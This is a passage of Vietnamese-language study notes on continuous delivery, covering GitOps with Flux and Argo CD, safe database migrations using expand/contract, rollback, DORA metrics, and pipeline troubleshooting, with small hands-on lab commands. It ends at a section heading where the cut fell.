+<p class="lead">GitOps lấy Git làm nguồn sự thật cho trạng thái mong muốn của hệ thống. Một bộ điều khiển trong cụm liên tục kéo trạng thái đó về và kéo cụm khớp với nó, thay vì pipeline CI đẩy thay đổi vào cụm.</p>
+<h2>Đẩy và kéo</h2>
+<div class="tw"><table><tr><th></th><th>CD kiểu đẩy (push)</th><th>GitOps kiểu kéo (pull)</th></tr><tr><td>Ai triển khai</td><td>Pipeline CI chạy <code>kubectl apply</code> hoặc <code>helm upgrade</code> vào cụm</td><td>Bộ điều khiển <b>trong cụm</b> (Flux, Argo CD) kéo từ Git và áp dụng</td></tr><tr><td>Thông tin xác thực</td><td>Pipeline cần quyền vào cụm (kubeconfig, token)</td><td>Cụm chỉ cần <b>quyền đọc</b> Git; <b>không</b> có thông tin đăng nhập cụm trong CI</td></tr><tr><td>Phát hiện drift</td><td>Không (chỉ biết lúc chạy pipeline)</td><td><b>Liên tục</b>: tự sửa hoặc báo khi ai đó đổi tay</td></tr><tr><td>Lịch sử, kiểm toán</td><td>Nhật ký pipeline</td><td>Lịch sử Git: ai, khi nào, vì sao (review qua PR)</td></tr><tr><td>Quay lui</td><td>Chạy lại pipeline với bản cũ</td><td><b><code>git revert</code></b>: bộ điều khiển tự đưa cụm về trạng thái cũ</td></tr></table></div>
+<p>Điểm mấu chốt về bảo mật: bề mặt tấn công nhỏ hơn vì CI không giữ khoá vào production.</p>
+<h2>Tách CI và CD, và tách repo</h2>
+<pre class="ascii"><code>  Repo ỨNG DỤNG                         Registry               Repo CẤU HÌNH (GitOps)                    CỤM
+  --------------                        --------               ----------------------                    ----
+  commit -&gt; CI: test, build -&gt;  push image :3f1a9c2   --&gt;   CI mở PR/commit: đổi tag thành 3f1a9c2  --&gt;  Flux/Argo CD
+                                                            (envs/dev/values.yaml)                        phát hiện thay đổi,
+                                                                    |                                      kéo và áp dụng
+                                                                    v  review/merge                        vào cụm
+                                                            Git là trạng thái mong muốn  &lt;-------- đối chiếu liên tục</code></pre>
+<ul><li><b>CI</b> (repo ứng dụng): kiểm thử, build, đẩy image, rồi <b>cập nhật tag</b> trong repo cấu hình.</li><li><b>CD</b> (bộ điều khiển trong cụm): thấy repo cấu hình đổi và đồng bộ cụm.</li><li><b>Hai repo riêng</b> (mã ứng dụng, cấu hình triển khai) tránh vòng lặp "commit cấu hình kích hoạt CI" và cho phép quyền khác nhau (lập trình viên đẩy mã, chỉ pipeline/nhóm nền tảng đổi cấu hình production).</li></ul>
+<h2>Cập nhật tag image trong repo cấu hình</h2>
+<div class="tw"><table><tr><th>Cách</th><th>Mô tả</th></tr><tr><td>Bước trong CI</td><td>CI sau khi đẩy image chạy <code>kustomize edit set image ...</code> hoặc <code>yq</code>, rồi commit/mở PR vào repo cấu hình</td></tr><tr><td><b>Image automation</b> của Flux</td><td>Flux theo dõi registry và tự cập nhật manifest trong Git khi có tag mới khớp chính sách (semver, regex)</td></tr><tr><td>Argo CD Image Updater</td><td>Tương tự cho Argo CD</td></tr><tr><td>Renovate</td><td>Mở PR cập nhật phiên bản image/chart, có thể gộp tự động theo quy tắc</td></tr></table></div>
+<pre><code><span class="cm"># trong CI của repo ứng dụng, sau khi đẩy image</span>
+git clone https://github.com/myorg/deploy-config.git &amp;&amp; cd deploy-config
+cd envs/dev &amp;&amp; kustomize edit set image web=registry.example.com/web:${GITHUB_SHA}
+git commit -am "dev: web -&gt; ${GITHUB_SHA::7}" &amp;&amp; git push</code></pre>
+<h2>Promotion giữa các môi trường</h2>
+<p>Đưa một phiên bản lên môi trường kế tiếp là <b>thay đổi trong repo cấu hình</b>:</p>
+<ul><li>Dev: tự động cập nhật tag mỗi merge.</li><li>Staging: PR tự động hoặc bán tự động sao chép tag từ dev sau khi kiểm thử xanh.</li><li>Production: PR <b>cần người duyệt</b> (đó là cổng Continuous Delivery), merge là phát hành.</li></ul>
+<p>Mỗi môi trường là một thư mục (hoặc nhánh) trong repo cấu hình. Thư mục thường dễ theo dõi hơn nhánh vì thấy được cả ba môi trường cùng lúc.</p>
+<h2>Công cụ và thiết lập</h2>
+<div class="tw"><table><tr><th>Công cụ</th><th>Ghi chú</th></tr><tr><td><b>Flux</b></td><td>Bộ công cụ GitOps theo từng thành phần (source, kustomize, helm, image automation)</td></tr><tr><td><b>Argo CD</b></td><td>Giao diện web mạnh, mô hình <code>Application</code>, theo dõi trạng thái đồng bộ trực quan</td></tr></table></div>
+<p>Cả hai đều theo dõi trạng thái và đồng bộ lại khi lệch. Chi tiết cài đặt, <code>Kustomization</code>, <code>HelmRelease</code> ở <a href="https://tracviethustcs.github.io/k8s-study-notes/#gitops" target="_blank" rel="noopener">GitOps: Argo CD và Flux</a> và <a href="https://tracviethustcs.github.io/k8s-study-notes/#setup-gitops" target="_blank" rel="noopener">GitOps bootstrap với Flux</a>.</p>
+<h2>Bí mật trong GitOps</h2>
+<p>Git không chứa bí mật dạng rõ. Hướng thường dùng: lưu <b>tham chiếu</b> trong Git và để Vault Secrets Operator hoặc External Secrets nạp bí mật vào cụm; hoặc mã hoá trong Git bằng Sealed Secrets hay SOPS (<a href="https://tracviethustcs.github.io/k8s-study-notes/#tool-secrets" target="_blank" rel="noopener">Secrets trong cụm</a>).</p>
+<h2>Lưu ý vận hành</h2>
+<ul><li><b>Đồng bộ tự động và <code>prune</code></b>: bật tự động đồng bộ cho dev; với production cân nhắc đồng bộ thủ công hoặc yêu cầu duyệt, và hiểu hành vi xoá tài nguyên không còn trong Git.</li><li><b>Thứ tự phụ thuộc</b>: CRD và operator trước, resource dùng chúng sau (<code>dependsOn</code> của Flux, sync wave của Argo CD).</li><li><b>Giám sát chính bộ điều khiển</b>: cảnh báo khi đồng bộ thất bại hay lệch kéo dài.</li><li><b>Hạn chế thay đổi tay</b> ngoài Git (<code>kubectl edit</code> ở production): bộ điều khiển sẽ ghi đè, và đó chính là mục đích.</li></ul>
+<div class="callout lab"><b>Mô phỏng vòng lặp GitOps bằng Git cục bộ</b><pre><code>mkdir -p ~/gitops-lab &amp;&amp; cd ~/gitops-lab &amp;&amp; rm -rf cfg &amp;&amp; git init -q cfg &amp;&amp; cd cfg
+mkdir -p envs/dev envs/prod
+echo 'image: registry.example.com/web:aaaaaaa' &gt; envs/dev/values.yaml
+echo 'image: registry.example.com/web:aaaaaaa' &gt; envs/prod/values.yaml
+git add . &amp;&amp; git -c user.name=t -c user.email=t@t commit -qm "ban dau"
+<span class="cm"># CI "đẩy" bản mới vào dev bằng một commit</span>
+sed -i 's/aaaaaaa/bbbbbbb/' envs/dev/values.yaml &amp;&amp; git -c user.name=ci -c user.email=ci@t commit -qam "dev: web -&gt; bbbbbbb"
+<span class="cm"># promotion lên prod = một thay đổi có review</span>
+sed -i 's/aaaaaaa/bbbbbbb/' envs/prod/values.yaml &amp;&amp; git -c user.name=ops -c user.email=ops@t commit -qam "prod: web -&gt; bbbbbbb (đã duyệt)"
+git log --oneline
+git revert --no-edit HEAD -q &amp;&amp; cat envs/prod/values.yaml     # quay lui = git revert</code></pre>
+<p>Quan sát: lịch sử Git cho thấy ai đổi gì, khi nào. Sau <code>git revert</code>, trạng thái mong muốn của prod về bản cũ; trong GitOps, bộ điều khiển sẽ tự kéo cụm về trạng thái đó.</p></div>
+</article>
+<article class="page" data-id="db-migrations" data-group="Phát hành" data-title="Thay đổi database trong phát hành liên tục" hidden>
+<h1>Thay đổi database trong phát hành liên tục</h1>
+<p class="lead">Mã có thể quay lui trong vài giây; dữ liệu thì không. Thay đổi schema là phần rủi ro nhất của việc phát hành, và cần cách làm riêng để vẫn triển khai thường xuyên và an toàn.</p>
+<h2>Vấn đề</h2>
+<p>Khi triển khai cuốn chiếu hoặc canary, <b>bản cũ và bản mới chạy cùng lúc trên cùng database</b>. Nếu migration đổi tên cột hay xoá bảng một lần, bản cũ đang chạy sẽ hỏng ngay. Và nếu bản mới có lỗi, quay lui mã không hoàn tác được thay đổi schema hay dữ liệu.</p>
+<p>Hệ quả: schema luôn phải <b>tương thích với cả phiên bản cũ lẫn mới</b> trong thời gian chuyển đổi.</p>
+<h2>Mẫu expand / contract (parallel change)</h2>
+<p>Chia một thay đổi phá vỡ thành nhiều bước nhỏ, mỗi bước tương thích ngược và triển khai riêng:</p>
+<pre class="ascii"><code>  Mục tiêu: đổi tên cột  users.name  -&gt;  users.full_name
+
+  1. EXPAND     thêm cột mới full_name (cho phép NULL)            | bản cũ vẫn chạy
+  2. DEPLOY     bản mới GHI vào cả name và full_name, ĐỌC từ name  | tương thích cả hai
+  3. BACKFILL   sao chép dữ liệu cũ sang full_name (theo lô)       | chạy nền, kiểm tra
+  4. DEPLOY     bản mới ĐỌC từ full_name (vẫn ghi cả hai)         | chuyển dần
+  5. DEPLOY     bản mới chỉ dùng full_name                         | không còn tham chiếu name
+  6. CONTRACT   xoá cột name                                       | bước phá vỡ cuối, rất muộn</code></pre>
+<p>Nhiều bước, nhưng mỗi bước <b>an toàn và quay lui được</b>; việc xoá thật sự (bước cuối) chỉ làm khi chắc chắn không còn gì dùng nó.</p>
+<h2>Quy tắc cho migration an toàn</h2>
+<div class="tw"><table><tr><th>Nên</th><th>Tránh (trong cùng một lần phát hành)</th></tr><tr><td>Thêm cột cho phép NULL hoặc có giá trị mặc định</td><td>Đổi tên hoặc xoá cột đang được bản cũ dùng</td></tr><tr><td>Thêm bảng, thêm chỉ mục (tạo <b>đồng thời</b> nếu hỗ trợ, ví dụ <code>CREATE INDEX CONCURRENTLY</code> trong PostgreSQL)</td><td>Thêm cột <code>NOT NULL</code> không mặc định trên bảng lớn (khoá bảng)</td></tr><tr><td>Backfill theo <b>lô nhỏ</b> trong tiến trình nền</td><td><code>UPDATE</code> cả bảng lớn trong một giao dịch</td></tr><tr><td>Tách thay đổi schema và thay đổi mã thành các bản phát hành khác nhau</td><td>Gộp migration phá vỡ và mã mới trong cùng một lần triển khai</td></tr><tr><td>Kiểm thử migration trên dữ liệu có kích thước gần với thật</td><td>Chạy lần đầu trên production</td></tr><tr><td>Đặt <code>lock_timeout</code> để migration không treo chặn cả hệ thống</td><td>Giữ khoá bảng lâu</td></tr></table></div>
+<p>Trên bảng lớn, nhiều lệnh <code>ALTER</code> có thể khoá bảng và chặn mọi truy vấn: biết lệnh nào khoá trên database của bạn (và công cụ thay đổi schema online như <code>gh-ost</code>, <code>pt-online-schema-change</code> cho MySQL).</p>
+<h2>Chạy migration trong pipeline</h2>
+<div class="tw"><table><tr><th>Cách</th><th>Ghi chú</th></tr><tr><td><b>Job riêng trước khi triển khai</b> (Kubernetes Job, Helm hook <code>pre-upgrade</code>, Argo CD <code>PreSync</code>)</td><td>Phổ biến: migration chạy một lần, xong mới rolling update</td></tr><tr><td>Khi ứng dụng khởi động (mỗi Pod tự migrate)</td><td>Dễ nhưng nguy hiểm: nhiều Pod chạy đồng thời; cần khoá phân tán</td></tr><tr><td>Bước thủ công cho thay đổi lớn</td><td>Hợp lý cho migration nặng, có người theo dõi</td></tr></table></div>
+<p>Công cụ quản lý migration có phiên bản: <b>Flyway</b>, <b>Liquibase</b>, <b>Alembic</b> (Python), Prisma/Knex/Rails/Django migrations. Chúng ghi lại migration nào đã chạy, để chạy lặp lại an toàn (idempotent theo phiên bản).</p>
+<pre><code>apiVersion: batch/v1
+kind: Job
+metadata:
+  name: migrate-3f1a9c2
+  annotations:
+    argocd.argoproj.io/hook: PreSync          # chạy trước khi đồng bộ ứng dụng (Argo CD)
+spec:
+  backoffLimit: 0
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: migrate
+          image: registry.example.com/web:3f1a9c2
+          command: ["./migrate", "--up"]</code></pre>
+<h2>Quay lui</h2>
+<ul><li><b>Mã</b>: quay lui nhanh (phiên bản cũ), miễn là schema vẫn tương thích: đó là lý do dùng expand/contract.</li><li><b>Schema</b>: ưu tiên <b>tiến lên (roll forward)</b> bằng migration sửa lỗi, vì migration "xuống" (down) hiếm khi an toàn với dữ liệu đã phát sinh.</li><li><b>Dữ liệu</b>: trước thay đổi rủi ro, có <b>bản sao lưu hoặc snapshot</b> vừa lấy và đã biết cách khôi phục (<a href="https://tracviethustcs.github.io/linux-network-notes/#lx-backup" target="_blank" rel="noopener">Backup</a>); với database lớn, xem xét chạy trên bản sao trước.</li><li><b>Cờ tính năng</b> giúp tắt đường mã mới đụng tới cột mới mà không cần đổi schema.</li></ul>
+<div class="callout lab"><b>Thử expand/contract với SQLite</b><pre><code>cd ~ &amp;&amp; rm -f mig.db
+sqlite3 mig.db "create table users(id integer primary key, name text); insert into users(name) values ('an'),('binh');"
+<span class="cm"># 1. EXPAND: thêm cột mới, cho phép NULL</span>
+sqlite3 mig.db "alter table users add column full_name text;"
+<span class="cm"># 2-3. Bản mới ghi cả hai, backfill dữ liệu cũ</span>
+sqlite3 mig.db "update users set full_name = name where full_name is null;"
+<span class="cm"># bản CŨ vẫn đọc được name bình thường:</span>
+sqlite3 mig.db "select id, name from users;"
+<span class="cm"># bản MỚI đọc full_name:</span>
+sqlite3 mig.db "select id, full_name from users;"
+<span class="cm"># 6. CONTRACT (chỉ sau khi không còn gì dùng name)</span>
+sqlite3 mig.db "alter table users drop column name;"
+sqlite3 mig.db "select * from users;"</code></pre>
+<p>Tại bước nào nếu xoá cột <code>name</code> quá sớm thì bản cũ đang chạy sẽ hỏng? Vì sao chia thành nhiều bước lại cho phép quay lui ở mỗi bước?</p></div>
+</article>
+<article class="page" data-id="rollback" data-group="Phát hành" data-title="Rollback và khôi phục" hidden>
+<h1>Rollback và khôi phục</h1>
+<p class="lead">Mọi phát hành đều có thể hỏng. Khả năng khôi phục nhanh quan trọng hơn việc cố không bao giờ hỏng: nó quyết định bạn mất vài phút hay vài giờ.</p>
+<h2>Quay lui hay tiến lên</h2>
+<div class="tw"><table><tr><th></th><th>Rollback (quay lui)</th><th>Roll forward (tiến lên)</th></tr><tr><td>Cách</td><td>Triển khai lại <b>phiên bản trước</b></td><td>Sửa lỗi và phát hành bản mới</td></tr><tr><td>Tốc độ</td><td>Thường nhanh nhất</td><td>Tuỳ thời gian sửa và pipeline</td></tr><tr><td>Khi hợp</td><td>Lỗi rõ ràng trong bản mới, schema vẫn tương thích</td><td>Đã có thay đổi dữ liệu/schema không đảo ngược, hoặc bản sửa nhỏ và nhanh</td></tr><tr><td>Rủi ro</td><td>Phiên bản cũ có thể không còn tương thích với dữ liệu mới</td><td>Sửa vội có thể thêm lỗi mới</td></tr></table></div>
+<p>Quy tắc thực tế: <b>giảm thiệt hại trước</b> (quay lui, tắt cờ, rút canary), tìm nguyên nhân gốc sau.</p>
+<h2>Các cơ chế quay lui</h2>
+<div class="tw"><table><tr><th>Cơ chế</th><th>Cách làm</th><th>Tốc độ</th></tr><tr><td><b>Cờ tính năng / công tắc khẩn cấp</b></td><td>Tắt tính năng lỗi</td><td>Giây</td></tr><tr><td><b>Rút canary / đổi lại Service</b></td><td>Đưa traffic về bản ổn định (Argo Rollouts, blue-green)</td><td>Giây đến phút</td></tr><tr><td><b>Rollout ngược của Kubernetes</b></td><td><code>kubectl rollout undo deployment/web</code></td><td>Phút</td></tr><tr><td><b>GitOps: revert</b></td><td><code>git revert</code> commit triển khai; Flux/Argo CD đưa cụm về trạng thái cũ</td><td>Phút</td></tr><tr><td><b>Triển khai lại artifact cũ</b></td><td>Chạy lại pipeline với tag/digest của bản trước (artifact còn nguyên nhờ chính sách giữ lại)</td><td>Phút</td></tr><tr><td><b>Khôi phục dữ liệu</b></td><td>Khôi phục từ snapshot/backup</td><td>Phút đến giờ</td></tr></table></div>
+<pre><code>kubectl rollout history deployment/web
+kubectl rollout undo deployment/web                       # về bản trước
+kubectl rollout undo deployment/web --to-revision=3
+kubectl rollout status deployment/web</code></pre>
+<p>Với GitOps, <b>đừng</b> dùng <code>kubectl rollout undo</code> làm cách chính: bộ điều khiển sẽ đưa cụm về lại trạng thái trong Git. Quay lui đúng cách là <code>git revert</code> trong repo cấu hình.</p>
+<h2>Điều kiện để quay lui thật sự hoạt động</h2>
+<ul><li><b>Artifact cũ còn tồn tại</b> và truy cập được (chính sách giữ lại không xoá bản đã phát hành).</li><li><b>Schema tương thích</b> hai chiều (<a href="#db-migrations">Migration database</a>).</li><li><b>Cấu hình và bí mật</b> của bản cũ vẫn có.</li><li>Quy trình quay lui đã <b>được thử</b>, không phải lần đầu thực hiện giữa sự cố. Diễn tập định kỳ.</li><li>Người trực biết <b>ngưỡng quyết định</b>: lỗi bao nhiêu hoặc kéo dài bao lâu thì quay lui (không đợi "xem thêm một chút").</li></ul>
+<h2>Tự động quay lui</h2>
+<p>Cổng phát hành dựa trên chỉ số có thể <b>tự quay lui</b> khi tỷ lệ lỗi hoặc độ trễ vượt ngưỡng (<a href="#progressive-delivery">Progressive delivery</a>). Với triển khai thường, probe <code>readiness</code> thất bại khiến rolling update dừng lại thay vì thay hết Pod, và <code>progressDeadlineSeconds</code> đánh dấu Deployment thất bại để cảnh báo/quay lui.</p>
+<h2>Khi sự cố xảy ra</h2>
+<ol><li><b>Phát hiện</b>: cảnh báo từ giám sát, không phải từ người dùng.</li><li><b>Chẩn đoán nhanh</b>: có phải do thay đổi vừa triển khai không? (Đối chiếu thời điểm lỗi với bản ghi triển khai.)</li><li><b>Giảm thiệt hại</b>: quay lui hoặc tắt cờ ngay nếu nghi do thay đổi.</li><li><b>Xác nhận khôi phục</b>: chỉ số trở lại bình thường.</li><li><b>Giao tiếp</b>: thông báo cho người liên quan.</li><li><b>Sau sự cố</b>: viết postmortem không đổ lỗi, ghi nguyên nhân gốc, điều gì hoạt động và không, và hành động cải thiện có người chịu trách nhiệm.</li></ol>
+<p>Gắn <b>dấu mốc triển khai</b> (deploy marker) lên biểu đồ giám sát giúp thấy ngay lỗi bắt đầu sau lần triển khai nào (<a href="#metrics-dora">DORA và đo lường</a>).</p>
+<div class="callout lab"><b>Diễn tập quay lui trong cụm thử</b><pre><code>kind create cluster --name rb-lab
+kubectl create deployment web --image=nginx:1.26 --replicas=2
+kubectl rollout status deployment/web
+kubectl set image deployment/web nginx=nginx:khong-ton-tai          # bản "hỏng"
+sleep 15; kubectl get pods; kubectl rollout status deployment/web --timeout=20s
+kubectl rollout history deployment/web
+kubectl rollout undo deployment/web &amp;&amp; kubectl rollout status deployment/web
+kubectl get pods
+kind delete cluster --name rb-lab</code></pre>
+<p>Quan sát: rolling update với image hỏng có làm cả Pod cũ biến mất không? Vì sao ứng dụng vẫn phục vụ được trong lúc bản mới lỗi?</p></div>
+</article>
+<article class="page" data-id="metrics-dora" data-group="Vận hành" data-title="DORA và đo lường" hidden>
+<h1>DORA và đo lường</h1>
+<p class="lead">Không đo thì không cải thiện được, nhưng đo sai còn tệ hơn không đo. Các chỉ số DORA đo hiệu quả của cả quy trình phát hành, và chỉ có ý nghĩa nếu dùng để học chứ không để chấm điểm người.</p>
+<h2>Bốn chỉ số</h2>
+<div class="tw"><table><tr><th>Chỉ số</th><th>Câu hỏi</th><th>Cách đo</th></tr><tr><td><b>Deployment frequency</b> (tần suất triển khai)</td><td>Bao lâu triển khai lên production một lần?</td><td>Đếm số lần triển khai thành công lên production mỗi ngày/tuần</td></tr><tr><td><b>Lead time for changes</b> (thời gian đưa thay đổi lên)</td><td>Từ commit tới chạy trên production mất bao lâu?</td><td>Thời điểm triển khai trừ thời điểm commit (hoặc merge); lấy trung vị</td></tr><tr><td><b>Change failure rate</b> (tỷ lệ thay đổi gây lỗi)</td><td>Bao nhiêu phần trăm triển khai gây sự cố cần khắc phục (quay lui, hotfix)?</td><td>Số triển khai gây lỗi chia tổng số triển khai</td></tr><tr><td><b>Time to restore</b> (thời gian khôi phục)</td><td>Khi có sự cố, mất bao lâu để khôi phục dịch vụ?</td><td>Thời điểm khôi phục trừ thời điểm bắt đầu sự cố; lấy trung vị</td></tr></table></div>
+<p>Hai chỉ số đầu đo <b>tốc độ</b>, hai chỉ số sau đo <b>độ ổn định</b>. Phát hiện chính của nghiên cứu là các nhóm làm tốt thường tốt ở <b>cả hai</b>, vì thay đổi nhỏ và thường xuyên vừa nhanh vừa ít rủi ro hơn bản phát hành to và hiếm. Một số báo cáo DORA gần đây còn nhấn mạnh thêm độ tin cậy vận hành và đổi tên hoặc điều chỉnh cách tính chỉ số thứ tư: hãy đọc báo cáo hiện hành thay vì dựa vào bảng cố định.</p>
+<h2>Lấy dữ liệu ở đâu</h2>
+<div class="tw"><table><tr><th>Cần</th><th>Nguồn</th></tr><tr><td>Thời điểm commit/merge</td><td>Git, nền tảng quản lý mã</td></tr><tr><td>Thời điểm triển khai production</td><td>Sự kiện triển khai của CI/CD (GitHub <code>deployments</code>, GitLab <code>environments</code>), hoặc sự kiện của Argo CD/Flux</td></tr><tr><td>Triển khai gây lỗi</td><td>Gắn nhãn từ hệ thống sự cố (PagerDuty, Jira, issue gắn nhãn <code>incident</code>) liên kết tới bản triển khai</td></tr><tr><td>Thời điểm sự cố bắt đầu/kết thúc</td><td>Hệ thống cảnh báo và quản lý sự cố</td></tr></table></div>
+<p>Cách đơn giản để bắt đầu: bảng tính cập nhật tay hằng tuần với vài chục triển khai gần nhất, rồi tự động hoá khi thấy giá trị. Có công cụ chuyên dụng (Four Keys là dự án mã nguồn mở mẫu, các nền tảng thương mại, và bảng điều khiển DORA tích hợp trong một số dịch vụ), nhưng đừng mua công cụ trước khi bạn biết mình muốn trả lời câu hỏi gì.</p>
+<h2>Dấu mốc triển khai</h2>
+<p>Ghi mỗi lần triển khai thành một <b>sự kiện</b> (phiên bản, người/pipeline, thời điểm, môi trường) và hiển thị lên biểu đồ giám sát. Khi một chỉ số xấu đi, bạn thấy ngay nó bắt đầu sau lần triển khai nào. Đây là công cụ chẩn đoán sự cố hữu ích nhất và gần như miễn phí.</p>
+<h2>SLO làm cổng phát hành</h2>
+<p>Kết nối phát hành với độ tin cậy:</p>
+<ul><li><b>SLI</b>: chỉ số đo trải nghiệm (tỷ lệ yêu cầu thành công, độ trễ p99).</li><li><b>SLO</b>: mục tiêu (ví dụ 99,9% yêu cầu thành công trong 30 ngày).</li><li><b>Ngân sách lỗi (error budget)</b>: phần "được phép hỏng" còn lại (0,1% trong ví dụ). Còn nhiều ngân sách thì phát hành mạnh tay, cạn ngân sách thì ưu tiên ổn định hơn tính năng mới.</li></ul>
+<p>Cổng canary tự động (<a href="#progressive-delivery">Progressive delivery</a>) chính là kiểm tra SLI của bản mới.</p>
+<h2>Dùng chỉ số đúng cách</h2>
+<div class="callout warn"><b>Chỉ số bị biến thành mục tiêu sẽ bị làm sai lệch (định luật Goodhart)</b><p>Nếu đem chỉ số ra chấm điểm cá nhân hay đội, người ta sẽ tối ưu con số thay vì kết quả: tách một thay đổi thành nhiều lần triển khai vô nghĩa để tăng tần suất, hoặc không ghi nhận sự cố để giảm tỷ lệ lỗi. Dùng chỉ số để <b>thấy nút thắt và so sánh với chính mình theo thời gian</b>, không để xếp hạng.</p></div>
+<ul><li>Xem <b>xu hướng</b>, không chỉ một con số; so một đội với chính nó qua thời gian, không so các đội khác bản chất.</li><li>Dùng <b>trung vị và phân vị</b>, không chỉ trung bình (một vài ca cực đoan làm lệch trung bình).</li><li>Đo cả bốn cùng nhau: tăng tốc độ mà ổn định tụt là tín hiệu xấu.</li><li>Dùng số liệu để <b>đặt câu hỏi</b> ("vì sao lead time ở dịch vụ này dài gấp ba?") chứ không để kết luận.</li></ul>
+<h2>Tìm nút thắt từ lead time</h2>
+<p>Tách lead time thành các đoạn: thời gian chờ review, thời gian pipeline chạy, thời gian chờ duyệt triển khai, thời gian từ merge tới production. Đoạn dài nhất là nơi cần cải thiện. Thường là <b>chờ đợi</b> (review, duyệt, hàng đợi runner), không phải thời gian máy chạy.</p>
+<div class="callout lab"><b>Tính lead time từ Git</b><pre><code><span class="cm"># trong một repo có tag phát hành dạng vX.Y.Z</span>
+for t in $(git tag --sort=-creatordate | head -5); do
+  prev=$(git describe --tags --abbrev=0 "$t^" 2&gt;/dev/null) || continue
+  echo "== $prev -&gt; $t"
+  git log --format='%ct' "$prev..$t" | sort -n | head -1 | { read first; tagt=$(git log -1 --format=%ct "$t"); echo "  commit cũ nhất tới tag: $(( (tagt - first) / 3600 )) giờ"; }
+done</code></pre>
+<p>Hoặc dùng bảng tính: ghi 10 lần triển khai gần nhất kèm thời điểm commit đầu tiên của mỗi lần. Tính trung vị của lead time và tần suất triển khai mỗi tuần. Đoạn nào trong quy trình của bạn chiếm nhiều thời gian chờ nhất?</p></div>
+</article>
+<article class="page" data-id="pipeline-ops" data-group="Vận hành" data-title="Hiệu năng và sự cố của pipeline" hidden>
+<h1>Hiệu năng và sự cố của pipeline</h1>
+<p class="lead">Pipeline chậm hoặc hay lỗi ngẫu nhiên làm cả nhóm mất niềm tin và bỏ qua nó. Trang này gồm cách tăng tốc và cách chẩn đoán các lỗi phổ biến.</p>
+<h2>Tăng tốc</h2>
+<div class="tw"><table><tr><th>Kỹ thuật</th><th>Cách làm</th></tr><tr><td><b>Cache phụ thuộc</b></td><td>Khoá cache theo hash của tệp khoá (<code>package-lock.json</code>, <code>requirements.txt</code>, <code>go.sum</code>); đừng cache thư mục build đầy đủ không kiểm soát</td></tr><tr><td><b>Cache layer Docker</b></td><td><code>cache-from/cache-to</code> của buildx (loại <code>gha</code> hoặc <code>registry</code>); sắp xếp Dockerfile để phụ thuộc ở trên (<a href="https://tracviethustcs.github.io/docker-container-notes/#build-best" target="_blank" rel="noopener">Dockerfile tốt</a>)</td></tr><tr><td><b>Song song hoá</b></td><td>Tách job độc lập chạy cùng lúc; chia bộ test thành nhiều phần (sharding)</td></tr><tr><td><b>Chỉ chạy việc liên quan</b></td><td>Bộ lọc đường dẫn (<code>paths:</code> của Actions, <code>rules: changes:</code> của GitLab) để thay đổi tài liệu không build image</td></tr><tr><td><b>Dừng sớm</b></td><td>Lint và test nhanh chạy trước; <code>fail-fast</code>; huỷ lần chạy cũ khi có commit mới (<code>concurrency</code>)</td></tr><tr><td><b>Runner đủ mạnh</b></td><td>Với job nặng, runner lớn hơn thường rẻ hơn tổng thời gian chờ của lập trình viên</td></tr><tr><td><b>Build tăng dần (incremental)</b></td><td>Công cụ build có cache từ xa (Bazel, Gradle, Nx, Turborepo) cho monorepo</td></tr></table></div>
+<pre><code>on:
+  pull_request:
+    paths:
+      - "src/**"
+      - "Dockerfile"
+      - ".github/workflows/ci.yml"        # đổi chính pipeline cũng phải chạy</code></pre>
+<p>Đo trước khi tối ưu: nền tảng cho biết thời gian từng bước; tìm bước chiếm nhiều nhất. Tối ưu bước 2 giây là vô ích khi bước chậm là 8 phút.</p>
+<h2>Pipeline với monorepo</h2>
+<p>Chỉ build và kiểm thử <b>thành phần bị ảnh hưởng</b>: lọc theo đường dẫn, hoặc công cụ hiểu đồ thị phụ thuộc (Nx, Bazel). Giữ một bước kiểm tra toàn bộ ở nhánh chính hoặc theo lịch để bắt các phụ thuộc bị bỏ sót.</p>
+<h2>Các lỗi thường gặp</h2>
+<div class="tw"><table><tr><th>Triệu chứng</th><th>Nguyên nhân thường gặp</th><th>Cách xử lý</th></tr><tr><td>"Chạy được trên máy tôi" nhưng đỏ trên CI</td><td>Khác phiên bản công cụ, biến môi trường, hệ điều hành, thứ tự test, dữ liệu</td><td>Ghim phiên bản; chạy cùng lệnh qua <code>make</code>/script; chạy bằng cùng image (container) cục bộ</td></tr><tr><td>Test lúc xanh lúc đỏ</td><td>Test không ổn định: phụ thuộc thời gian, thứ tự, dữ liệu dùng chung</td><td>Cách ly, sửa gốc, không chỉ <code>retry</code> (<a href="#testing-strategy">Kiểm thử</a>)</td></tr><tr><td><code>permission denied</code> với Docker</td><td>Runner không có quyền vào <code>docker.sock</code>, hoặc đang chạy non-root</td><td>Dùng runner phù hợp, hoặc build không cần daemon (buildx, Kaniko)</td></tr><tr><td><code>no space left on device</code></td><td>Runner đầy do image, cache, artifact tích tụ</td><td>Dọn (<code>docker system prune</code>), runner tạm thời, giới hạn artifact</td></tr><tr><td>Hết giới hạn tốc độ khi kéo image (<code>toomanyrequests</code>)</td><td>Docker Hub giới hạn pull</td><td>Đăng nhập registry, dùng mirror/cache nội bộ</td></tr><tr><td>Bí mật rỗng trong job</td><td>PR từ fork không có bí mật; bí mật theo môi trường chưa được duyệt; tên sai</td><td>Kiểm tra phạm vi bí mật và điều kiện chạy</td></tr><tr><td>Cache không bao giờ trúng</td><td>Khoá cache đổi mỗi lần (có thời gian, SHA), hoặc đường dẫn sai</td><td>Khoá theo hash tệp khoá; kiểm tra log "cache hit/miss"</td></tr><tr><td>Cache cho kết quả sai</td><td>Cache chứa thứ lỗi thời hoặc đã bị nhiễm</td><td>Đổi khoá/phiên bản cache; không để cache quyết định tính đúng</td></tr><tr><td>Job bị treo hoặc bị huỷ do hết thời gian</td><td>Chờ tài nguyên, vòng lặp chờ vô hạn, test treo</td><td>Đặt <code>timeout-minutes</code> cho job và bước; xem log tới điểm cuối</td></tr><tr><td>Hàng đợi runner dài</td><td>Quá ít runner so với số job</td><td>Thêm runner, runner co giãn tự động, giảm job không cần thiết</td></tr><tr><td>Triển khai thành công nhưng ứng dụng hỏng</td><td>Thiếu kiểm tra sau triển khai</td><td>Thêm smoke test và kiểm tra sức khoẻ trong pipeline; quay lui tự động</td></tr><tr><td>Hai lần triển khai chạy chồng nhau</td><td>Không có khoá</td><td><code>concurrency</code> (Actions), <code>resource_group</code> (GitLab)</td></tr></table></div>
+<h2>Gỡ lỗi pipeline</h2>
